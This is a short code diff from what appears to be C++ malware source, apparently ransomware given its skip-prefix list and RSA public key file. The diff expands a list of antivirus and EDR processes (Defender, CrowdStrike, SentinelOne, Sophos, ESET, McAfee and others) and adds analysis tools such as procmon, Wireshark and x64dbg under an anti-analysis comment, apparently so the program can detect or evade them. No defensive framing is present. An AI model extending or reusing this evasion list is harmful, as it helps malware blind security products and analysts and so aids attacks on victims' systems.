@@ -98,8 +98,20 @@ const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
 const std::string PUBLIC_KEY_FILE = "rsa_public.der";
 
 const std::vector<std::string> AV_EDR_PROCESSES = {
-    "MsMpEng.exe", "MsSense.exe", "Sense.exe", "csfalcon.exe", "falcon.exe",
-    "sentinelagent.exe", "cb.exe", "edr.exe", "xagt.exe", "avp.exe", "bdagent.exe"
+    // Microsoft Defender
+    "MsMpEng.exe", "MsSense.exe", "Sense.exe", "MpCmdRun.exe",
+    // CrowdStrike & SentinelOne
+    "csfalcon.exe", "CSFalconService.exe", "sentinelagent.exe", "SentinelServiceHost.exe",
+    // Kaspersky & Bitdefender
+    "avp.exe", "avpui.exe", "vsserv.exe", "bdagent.exe",
+    // Sophos & ESET
+    "SophosFS.exe", "SophosHealth.exe", "ekrn.exe", "egui.exe",
+    // Carbon Black & FireEye
+    "cb.exe", "CbResponse.exe", "xagt.exe", "fireeye.exe",
+    // Symantec & McAfee
+    "ccSvcHst.exe", "rtvscan.exe", "McShield.exe", "mfefire.exe",
+    // Monitoring Tools (Anti-Analysis)
+    "ProcessHacker.exe", "procmon.exe", "wireshark.exe", "x64dbg.exe"
 };
 
 // ====================== GLOBAL MUTEX ======================
